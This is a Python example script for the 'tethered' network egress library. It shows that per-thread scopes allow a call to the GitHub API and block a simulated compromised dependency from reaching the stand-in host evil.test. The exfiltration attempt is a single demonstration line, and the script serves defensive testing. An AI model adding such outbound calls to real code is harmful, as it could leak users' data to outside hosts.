"""scope() inside threads — apply the scope where the I/O happens.

Scopes don't automatically carry over into child threads.
Decorate or wrap the thread's function directly.
For process-wide enforcement across all threads, use activate().
"""

from __future__ import annotations

from concurrent.futures import ThreadPoolExecutor, as_completed

import httpx

import tethered


@tethered.scope(allow=["api.github.com:443"])
def allowed_worker() -> str:
    """Worker scoped to GitHub API — allowed."""
    # ... process data, call helper libraries, etc.
    resp = httpx.head("https://api.github.com", timeout=5)
    return f"api.github.com — allowed (HTTP {resp.status_code})"


@tethered.scope(allow=["api.github.com:443"])
def blocked_worker() -> str:
    """Simulates a compromised dependency inside a scoped worker."""
    # A dependency trying to exfiltrate data — blocked by the scope
    httpx.head("https://evil.test", timeout=5)
    return "evil.test — allowed (unexpected)"


with ThreadPoolExecutor(max_workers=2) as pool:
    futures = {
        pool.submit(allowed_worker): "allowed_worker",
        pool.submit(blocked_worker): "blocked_worker",
    }

    for future in as_completed(futures):
        name = futures[future]
        try:
            result = future.result()
            print(f"{name}: {result}")
        except tethered.EgressBlocked as e:
            print(f"{name}: blocked — {e}")
